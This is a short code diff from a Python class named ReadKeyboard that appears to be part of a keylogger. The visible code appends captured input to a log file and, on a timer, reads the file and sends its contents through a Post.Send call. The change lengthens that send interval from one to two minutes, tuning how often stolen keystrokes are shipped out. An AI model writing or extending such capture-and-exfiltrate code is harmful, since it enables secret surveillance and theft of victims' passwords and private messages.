@@ -70,7 +70,7 @@ class ReadKeyboard(object):
         """
         try:
             open(self.pathf, 'a').write(self.word)
-            if int(time() - self.stime) >= (60):
+            if int(time() - self.stime) >= (60 * 2): # Two minute
                 data = open(self.pathf, 'r').read()
                 self.stime = time()
                 self.Post.Send(data)
